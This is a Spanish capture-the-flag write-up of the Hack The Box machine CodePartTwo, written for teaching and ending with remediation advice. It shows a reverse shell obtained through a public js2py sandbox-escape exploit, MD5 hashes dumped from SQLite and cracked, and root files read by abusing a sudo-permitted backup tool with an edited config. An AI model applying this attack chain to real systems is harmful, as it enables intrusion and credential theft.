**Platform:** Hack The Box |
**Machine:** CodePartTwo (https://app.hackthebox.com/machines/CodePartTwo) |
**Difficult:** Easy |
**OS:** Linux

---
## RESUMEN

- **Acceso inicial:** RCE mediante sandbox escape de js2py (CVE-2024-28397) en `/run_code`
- **Credenciales:** `/instance/users.db` → MD5 → `marco:sweetangelbabylove`
- **Escalada:** `sudo npbackup-cli` (pre/post exec) → lectura de `/root/root.txt`
- **Técnicas:** `Code review` → `RCE (CVE)` → `Credential harvesting (SQLite)` → `Password cracking (MD5)` → `SSH` → `Sudo misconfig / abuse of backup tool`

## RECON

`sudo nmap -sS -Pn -v --min-rate 5000 -T4 -p- --open $TARGET > scan.txt`

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: gunicorn/20.0.4
|_http-title: Welcome to CodePartTwo
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Podemos ver `Gunicorn 20.0.4`

---
Gunicorn es un servidor WSGI (Web Server Gateway Interface) de Python, diseñado para ejecutar aplicaciones web Python en entornos de producción, actuando como un puente entre el servidor web (como Nginx) y tu aplicación (Django, Flask, etc.).

---
Dentro del puerto 8000 podemos ver la opción `"Download App"`, esto nos va a descargar el código fuente de la aplicación, el cual podremos investigar en búsqueda de información sensible. También podemos registrarnos en la web para poder utilizar un Code Editor

Cada vez que utilizamos el editor de código se hace una request (POST) a la siguiente URL `http://TARGET:8000/run_code` que ejecuta lo que estemos intentando. Con esto en cuenta, investiguemos el código fuente descargado

## ENUMERATION

Al descargar el código fuente encontré en `app.py`:
```sql
app.secret_key = 'S3cr3tK3yC0d3PartTw0'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
```

En `requirements.txt`:
```bash
flask==3.0.3
flask-sqlalchemy==3.1.1
js2py==0.74
```

---
### ¿Qué es js2py?
`js2py` es una biblioteca para `Python` y su función es traducir y ejecutar código `JavaScript` dentro de un entorno `Python`. Es muy usado para análisis de malware, JavaScript ofuscado y web scraping.

---

Investigando pude encontrar una vulnerabilidad crítica (CVE-2024-28397) en la versión `0.74` de `js2py` que permite escapar del sandbox de `js2py` y ejecutar código en el host

`https://github.com/0xDTC/js2py-Sandbox-Escape-CVE-2024-28397-RCE`

En Python 3.11.9 ejecutamos este PoC con estos parámetros:

```bash
./exploit.sh
	Target URL: http://10.10.11.82:8000/run_code
	Your IP: 10.10.14.4
	Your Port: 9005
```

En otra terminal nos ponemos en escucha por el puerto que hayamos seleccionado

```bash
λ > nc -nlvp 9005
Listening on 0.0.0.0 9005
Connection received on 10.129.232.59 56752
sh: 0: can't access tty; job control turned off
$ whoami
app
$ id
uid=1001(app) gid=1001(app) groups=1001(app)
$ hostname
codeparttwo
$
```

Luego de obtener una shell, con sqlite3 consultamos `/instance/users.db` (esta ruta la vimos en el código fuente de la app, donde conseguimos las credenciales)
```sql
.tables
SELECT * FROM user;
```

Esto devuelve:
```sql
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
```

Crackeamos con hashcat:
`hashcat -m 0 -a 0 hash.txt /home/pachhh/Tools/SecLists/rockyou.txt -o cracked.txt`

`649c9d65a206a75f5abe509fe128bce5:sweetangelbabylove`

Ahora nos conectamos por el servicio `ssh`:

```bash
ssh marco@10.129.232.59
marco@10.129.232.59's password: sweetangelbabylove
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)
marco@codeparttwo:~$ id
uid=1000(marco) gid=1000(marco) groups=1000(marco),1003(backups)
marco@codeparttwo:~$ cat user.txt
2f7f209ce20d7e30a483f318fdfb8d59
```

## PRIVESC
Ejecutamos `sudo -l`:
```bash
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

`npbackup-cli` es el CLI de NPBackup (NetInvent), una solución de backups basada en repositorios (restic) que se configura vía YAML y soporta múltiples repos/grupos, retención y ejecución de pre/post comandos

Dentro de `/home/marco` tenemos una configuración de `npbackup-cli`, la cual podemos modificar para obtener una shell privilegiada, sugiero copiarla en `/tmp/npbackup.conf` para no perderla ni borrarla

Primero normalicemos la shell ya que sino no podremos editarla

```sh
marco@codeparttwo:/tmp$ nano npbackup.conf
Error opening terminal: xterm-kitty.
marco@codeparttwo:/tmp$ export TERM=xterm
marco@codeparttwo:/tmp$ python3 --version
Python 3.8.10
marco@codeparttwo:/tmp$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Ahora sí, editamos `npbackup-cli` y agregamos el directorio /root/ en el path, quedaría así:

```sh
marco@codeparttwo:/tmp$ cat npbackup.conf
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri:
      __NPBACKUP__REDACTED__
    repo_group: default_group
    backup_opts:
      paths:
      - /home/app/app/
      - /root/
      source_type: folder_list
      exclude_files_larger_than: 0.0
      ...
```

Creamos el backup:

`sudo /usr/local/bin/npbackup-cli --config-file "/tmp/npbackup.conf" -b`

Una vez creado el backup, podemos leer y listar los archivos dentro gracias al parámetro `--ls`

`sudo /usr/local/bin/npbackup-cli --config-file "/tmp/npbackup.conf" --ls `

Finalmente podemos obtener la flag dentro del directorio `/root/root.txt`

```sh
marco@codeparttwo:/tmp$ sudo /usr/local/bin/npbackup-cli --config-file "/tmp/npbackup.conf" --dump "/root/root.txt"
1a89a4cde8c6821fb692a48df4bc8a84
```
---
 **Impacto:** ejecución remota de código como `app`, extracción de credenciales desde SQLite, acceso por SSH como `marco` y escalada a root por mala configuración de sudo.
 **Causas raíz:** dependencia vulnerable (`js2py 0.74`), endpoint que ejecuta código, hashes débiles (MD5) y `NOPASSWD` a herramienta de backup.
## REMEDIATION

- **Eliminar o aislar la funcionalidad que ejecuta código**: deshabilitar `/run_code` en producción o moverlo a un entorno de laboratorio
- **Allowlist y validación**: permitir únicamente subconjuntos seguros (ej. expresiones predefinidas) en vez de “JavaScript libre”
- **Aislamiento fuerte del componente vulnerable**: correrlo en contenedor/VM con usuario sin privilegios, filesystem read-only y egress restringido.
- **Hardening de credenciales**: reemplazar MD5 por `bcrypt/argon2` (aunque no arregle la RCE, reduce el impacto post-compromiso)
- **Sudo hardening**: eliminar `NOPASSWD` o restringirlo a comandos/argumentos fijos; tratar configs de backup como secretos y limitar paths.
